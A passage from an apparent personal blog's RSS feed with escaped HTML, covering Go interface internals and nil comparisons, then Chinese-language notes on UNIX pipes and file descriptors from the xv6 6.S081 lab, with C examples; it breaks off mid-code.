	&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unsafe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Pointer&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;itab&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;inter&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;interfacetype&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;_type&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;_type&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;link&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;itab&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;hash&lt;/span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// copy of _type.hash. Used for type switches.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;bad&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;// type does not implement interface
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;inhash&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;// has this itab been added to hash?
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;unused&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;fun&lt;/span&gt;    [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;uintptr&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// variable sized
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}

&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;interfacetype&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;typ&lt;/span&gt;     &lt;span style=&#34;color:#a6e22e&#34;&gt;_type&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;pkgpath&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;mhdr&lt;/span&gt;    []&lt;span style=&#34;color:#a6e22e&#34;&gt;imethod&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;interface&#34;&gt;&lt;code&gt;interface{}&lt;/code&gt;&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;eface&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;_type&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;_type&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;unsafe&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Pointer&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;nil&#34;&gt;&lt;code&gt;nil&lt;/code&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;interface nil := type == nil &amp;amp;&amp;amp; data == nil
struct nil := data == nil&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;common-interface-1&#34;&gt;common interface&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Coder&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;code&lt;/span&gt;()
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Gopher&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Gopher&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;code&lt;/span&gt;() {
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Coder&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;) 		&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c: %T, %v\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// c: &amp;lt;nil&amp;gt;, &amp;lt;nil&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Gopher&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)		&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// declare an interface `g`, type of `g` is still `nil`
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;g: %T, %v\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// g: *main.Gopher, &amp;lt;nil&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// assign interface `c` struct type `g`
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)		&lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c: %T, %v\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// c: *main.Gopher, &amp;lt;nil&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;output&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;true
c: &amp;lt;nil&amp;gt;, &amp;lt;nil&amp;gt;
true
g: *main.Gopher, &amp;lt;nil&amp;gt;
false
c: *main.Gopher, &amp;lt;nil&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;interface-1&#34;&gt;&lt;code&gt;interface{}&lt;/code&gt;&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt;{}
    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%T, %v\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;lt;nil&amp;gt;, &amp;lt;nil&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%T, %v\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// int, 8
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;.(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)
    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%T, %v\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// int, 8
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;output&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;nil&amp;gt;, &amp;lt;nil&amp;gt;
int, 8
int, 8 
&lt;/code&gt;&lt;/pre&gt;</content>
    </item>
    
    <item>
      <title>UNIX pipeline &amp; file descriptor</title>
      <link>https://resyon.github.io/posts/unix-pipeline-file-descriptor/</link>
      <pubDate>Sat, 11 Sep 2021 10:49:41 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/unix-pipeline-file-descriptor/</guid>
      <description>完成6.s081 lab1 后对pipeline, file descriptor 有了一定了解，做个笔记
 pipeline (pipe)  A pipe is a small kernel buffer exposed to processes as a pair of file descriptors, one for reading and one for writing. Writing data to one end of the pipe makes that data available for reading from the other end of the pipe. Pipes provide a way for processes to communicate.
 使用: int pd[2]; // make pipeline, return pd[0] for read, pd[1] for write if(pipe(pd) &amp;lt; 0){ // handle fail 	fprintf(stderr, &amp;#34;fail to make pipeline\n&amp;#34;); exit(1); } int pid = fork(); if(pid &amp;lt; 0){ // handle fail }else if(pid == 0){ // child 	char cnt = &amp;#34;this is test content from child process&amp;#34;; write(pd[1], cnt, strlen(cnt)); exit(0); }else{ // parent 	char buf[128]; // assume that size of content to read would not exceed buf 	read(pd[0], buf, sizeof(buf)); printf(&amp;#34;get buf from child, buf=&amp;lt;%s&amp;gt;\n&amp;#34;, buf); } file descriptor (fd) fd是对广义上的UNIX file进行引用的一层抽象，这层抽象使得在操作regular file, device, pipeline 等文件时，表面上一致，操作起来简单，(都可使用read(int fd,.</description>
      <content>&lt;blockquote&gt;
&lt;p&gt;完成&lt;code&gt;6.s081&lt;/code&gt; lab1 后对&lt;code&gt;pipeline&lt;/code&gt;, &lt;code&gt;file descriptor&lt;/code&gt; 有了一定了解，做个笔记&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;pipeline-pipe&#34;&gt;&lt;code&gt;pipeline&lt;/code&gt; (&lt;code&gt;pipe&lt;/code&gt;)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;A &lt;code&gt;pipe&lt;/code&gt; is a small kernel buffer exposed to processes as a pair of file descriptors, one for reading and one for writing. Writing data to one end of the pipe makes that data available for reading from the other end of the pipe. Pipes provide a way for processes to communicate.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;使用&#34;&gt;使用:&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; pd[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
&lt;span style=&#34;color:#75715e&#34;&gt;// make pipeline, return pd[0] for read, pd[1] for write
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(pipe(pd) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
	&lt;span style=&#34;color:#75715e&#34;&gt;// handle fail
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	fprintf(stderr, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fail to make pipeline&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
	exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; pid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fork();
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(pid &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
	&lt;span style=&#34;color:#75715e&#34;&gt;// handle fail
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(pid &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
	&lt;span style=&#34;color:#75715e&#34;&gt;// child
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; cnt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;this is test content from child process&amp;#34;&lt;/span&gt;;
	write(pd[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], cnt, strlen(cnt));
	exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
}&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
	&lt;span style=&#34;color:#75715e&#34;&gt;// parent
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;];
	&lt;span style=&#34;color:#75715e&#34;&gt;// assume that size of content to read would not exceed buf
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	read(pd[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buf));
	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;get buf from child, buf=&amp;lt;%s&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, buf);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;file-descriptor-fd&#34;&gt;&lt;code&gt;file descriptor&lt;/code&gt; (&lt;code&gt;fd&lt;/code&gt;)&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;fd&lt;/code&gt;是对广义上的&lt;code&gt;UNIX file&lt;/code&gt;进行引用的一层抽象，这层抽象使得在操作&lt;code&gt;regular file&lt;/code&gt;, &lt;code&gt;device&lt;/code&gt;, &lt;code&gt;pipeline&lt;/code&gt; 等文件时，表面上一致，操作起来简单，(都可使用&lt;code&gt;read(int fd,..)&lt;/code&gt;; &lt;code&gt;write(int fd,...)&lt;/code&gt;等透过&lt;code&gt;fd&lt;/code&gt;的&lt;code&gt;API&lt;/code&gt;), 但实现上，不同类型的文件大不相同.&lt;/p&gt;
&lt;h3 id=&#34;几个重要的fd特性&#34;&gt;几个重要的&lt;code&gt;fd&lt;/code&gt;特性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;总是自动打开3个&lt;code&gt;fd&lt;/code&gt;, 0=&lt;code&gt;stdin&lt;/code&gt; , 1=&lt;code&gt;stdout&lt;/code&gt;, 2=&lt;code&gt;stderr&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;总是选取最小的&lt;code&gt;fd&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;close(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/test.c&amp;#34;&lt;/span&gt;, O_RDONLY);
fprintf(stderr, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fd=%d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, fd); &lt;span style=&#34;color:#75715e&#34;&gt;// fd=1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;file descriptor table&lt;/code&gt;由进程维护，即进程间&lt;code&gt;fd&lt;/code&gt;互不影响&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;以下代码来自&lt;code&gt;lab 1&lt;/code&gt;实验&lt;code&gt;primes&lt;/code&gt;, 实现了下图所示的&lt;code&gt;埃氏筛法&lt;/code&gt;
&lt;img src=&#34;https://resyon.github.io/upload/2021/09/image-a50ab1eafdde4f5d8e9516ed77376b38.png&#34; alt=&#34;image.png&#34;&gt;
为摆脱&lt;code&gt;xv6&lt;/code&gt;对&lt;code&gt;fd&lt;/code&gt;数目的限制，每个子进程都对管道传入的&lt;code&gt;fd&lt;/code&gt;进行了多次重定向, 但在子进程改变&lt;code&gt;fd&lt;/code&gt;并不影响父进程，程序能正常执行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// redirect pd[k] to k, both pd[k] and k are fd
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;redirect&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; k, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; pd[]){
    close(k);
    dup(pd[k]);
    close(pd[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
    close(pd[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;loop&lt;/span&gt;(){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; p, v, pid;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; pd[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;p, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;))){
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;prime %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, p);
        pipe(pd);
	pid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fork();
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(pid &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
	    fprintf(stderr, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fail to fork, current pid=%d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, getpid());
	    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
	}&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(pid &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
            redirect(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, pd);
            loop();
        }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
            redirect(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, pd);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;))){
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(v &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
                    write(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;));
                }
            }
        }
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; p[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
    pipe(p);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(fork()&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
